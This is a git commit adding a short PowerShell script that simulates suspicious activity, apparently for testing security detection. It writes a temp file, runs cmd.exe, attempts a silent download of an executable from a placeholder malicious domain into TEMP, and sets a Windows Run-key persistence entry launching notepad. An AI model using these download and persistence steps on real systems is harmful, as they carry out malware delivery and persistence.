5f51c73261b259b886e948dd4f9ce95abbbada30
simoncaio <caiosimon@gmail.com>
2026-04-09 15:56:45 -0300

    Add files via upload

---
+++ script_ex1.ps1
@@ -0,0 +1,17 @@
+# Simula comportamento suspeito
+
+# 1. Criação de arquivo temporário
+$path = "$env:TEMP\test_suspicious.txt"
+"test" | Out-File $path
+
+# 2. Execução de comando
+Start-Process cmd.exe -ArgumentList "/c echo suspicious activity"
+
+# 3. Tentativa de download (pode usar URL inválida mesmo)
+try {
+    Invoke-WebRequest -Uri "http://example-malicious-domain.com/file.exe" -OutFile "$env:TEMP\file.exe"
+} catch {}
+
+# 4. Persistência simples (registry)
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+-Name "TestPersistence" -Value "notepad.exe" -PropertyType String
